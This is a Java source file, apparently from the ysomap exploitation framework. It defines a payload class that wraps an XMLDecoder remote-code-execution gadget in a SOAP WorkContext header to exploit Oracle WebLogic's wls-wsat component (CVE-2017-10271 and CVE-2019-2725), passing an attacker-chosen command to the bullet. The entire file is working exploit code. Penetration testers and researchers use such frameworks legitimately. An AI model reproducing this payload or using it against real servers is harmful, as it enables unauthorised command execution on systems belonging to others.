package ysomap.payloads.xmldecoder;

import ysomap.bullets.Bullet;
import ysomap.bullets.weblogic.xml.WeblogicXMLRCEBullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Payloads
@Targets({Targets.XMLDECODER})
@Authors({ Authors.WH1T3P1G })
@Require(bullets = {"WeblogicXMLJndiBullet","WeblogicXMLRCEBullet"}, param = false)
@Dependencies({"weblogic cve-2017-10271 & CVE-2019-2725 for wls-wsat"})
public class WeblogicXML1 extends XMLDecoderPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        Bullet bullet = new WeblogicXMLRCEBullet();
        bullet.set("cmd", args[0]);
        return bullet;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" +
                "  <soapenv:Header> \n" +
                "\t<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" + obj +
                "\n</work:WorkContext> \n" +
                "  </soapenv:Header>  \n" +
                "  <soapenv:Body/> \n" +
                "</soapenv:Envelope>";
        return payload;
    }

}
